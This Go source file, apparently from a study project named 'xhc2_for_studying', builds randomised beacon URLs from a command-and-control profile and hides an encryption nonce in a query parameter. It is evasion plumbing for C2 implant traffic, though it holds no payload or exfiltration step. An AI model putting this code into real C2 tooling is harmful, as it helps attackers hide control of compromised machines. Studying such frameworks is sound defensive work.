package client

import (
	"fmt"
	"math/rand/v2"
	"net/url"

	"xhc2_for_studying/protocol"
)

// randomPath 从 C2Profile 的候选池中生成一次随机 URL 路径。
func randomPath(p *protocol.C2Profile, ext string) []string {
	var dirs, files []string
	for _, seg := range p.PathSegments {
		if seg.IsFile {
			files = append(files, seg.Value)
		} else {
			dirs = append(dirs, seg.Value)
		}
	}

	var segments []string
	if len(dirs) > 0 && p.MaxPathLength > 0 {
		n := p.MinPathLength + rand.IntN(p.MaxPathLength-p.MinPathLength+1)
		for range n {
			segments = append(segments, dirs[rand.IntN(len(dirs))])
		}
	}
	if len(files) > 0 {
		filename := files[rand.IntN(len(files))]
		if ext != "" {
			filename = filename + ext
		}
		segments = append(segments, filename)
	}
	return segments
}

// buildRandomURL 生成完整的随机 URL。
func buildRandomURL(baseURL string, p *protocol.C2Profile, ext string) (*url.URL, error) {
	parsed, err := url.Parse(baseURL)
	if err != nil {
		return nil, fmt.Errorf("parse base url: %w", err)
	}
	segments := randomPath(p, ext)
	parsed = parsed.JoinPath(segments...)
	return parsed, nil
}

// embedEncryptionNonce 将 ChaCha20Poly1305 nonce 的 base64 值嵌入 URL 查询参数。
// 统一使用 urlparam 模式，作为 `?_=nonceB64` 参数发送。
func embedEncryptionNonce(u *url.URL, nonceB64 string) {
	q := u.Query()
	q.Set("_", nonceB64)
	u.RawQuery = q.Encode()
}
